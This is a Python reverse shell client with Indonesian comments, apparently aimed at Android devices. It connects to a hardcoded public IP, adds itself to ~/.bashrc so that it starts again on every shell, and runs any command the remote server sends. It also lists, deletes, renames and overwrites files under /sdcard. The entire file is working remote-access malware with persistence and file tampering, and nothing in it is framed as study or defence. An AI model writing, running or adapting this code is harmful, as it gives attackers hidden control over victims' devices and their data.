import socket
import subprocess
import time
import os

host = '188.166.211.53'  # Ganti ke IP publik/ngrok jika remote
port = 9999

def setup_persistence():
    try:
        bashrc_path = os.path.expanduser("~/.bashrc")
        script_path = os.path.abspath(__file__)
        autostart_line = f"python3 {script_path} &\n"

        # Cek apakah sudah ada sebelumnya
        if os.path.exists(bashrc_path):
            with open(bashrc_path, "r") as f:
                lines = f.readlines()

            if autostart_line not in lines:
                with open(bashrc_path, "a") as f:
                    f.write("\n# Auto start reverse shell\n")
                    f.write(autostart_line)
                print("[+] Persistence berhasil ditambahkan ke .bashrc")
            else:
                print("[*] Persistence sudah ada di .bashrc")
        else:
            with open(bashrc_path, "w") as f:
                f.write("# Auto start reverse shell\n")
                f.write(autostart_line)
            print("[+] File .bashrc dibuat dan persistence ditambahkan")
    except Exception as e:
        print(f"[!] Gagal menambahkan persistence: {str(e)}")

def connect():
    while True:
        try:
            client = socket.socket()
            client.connect((host, port))
            print("[+] Terhubung ke server")
            return client
        except Exception as e:
            print(f"[!] Gagal terhubung: {e}")
            time.sleep(5)

setup_persistence()
client = connect()

while True:
    try:
        command = client.recv(4096).decode().strip()

        if command.lower() == "exit":
            break

        elif command.lower() == "list_sdcard":
            try:
                files = subprocess.check_output("ls /sdcard", shell=True, text=True)
                output = f"[SDCARD] Berhasil membaca isi /sdcard:\n{files}"
            except Exception as e:
                output = f"[!] Gagal akses /sdcard: {str(e)}"
            client.send(output.encode())

        elif command.startswith("delete "):
            filepath = "/sdcard/" + command[7:].strip()
            try:
                os.remove(filepath)
                output = f"[+] File '{filepath}' berhasil dihapus."
            except Exception as e:
                output = f"[!] Gagal menghapus file: {str(e)}"
            client.send(output.encode())

        elif command.startswith("rename "):
            try:
                _, old_name, new_name = command.split(" ", 2)
                old_path = "/sdcard/" + old_name
                new_path = "/sdcard/" + new_name
                os.rename(old_path, new_path)
                output = f"[+] File berhasil di-rename ke '{new_name}'."
            except Exception as e:
                output = f"[!] Gagal merename file: {str(e)}"
            client.send(output.encode())

        elif command.startswith("edit "):
            try:
                _, filename, new_content = command.split(" ", 2)
                filepath = "/sdcard/" + filename
                with open(filepath, "w") as f:
                    f.write(new_content)
                output = f"[+] File '{filename}' berhasil diedit."
            except Exception as e:
                output = f"[!] Gagal mengedit file: {str(e)}"
            client.send(output.encode())

        else:
            try:
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                output = result.stdout + result.stderr
                if not output.strip():
                    output = "[+] Perintah berhasil tanpa output."
            except Exception as e:
                output = f"[!] Error: {str(e)}"
            client.send(output.encode())

    except Exception as e:
        print(f"[!] Koneksi terputus, mencoba menghubungkan ulang...")
        client.close()
        client = connect()

client.close()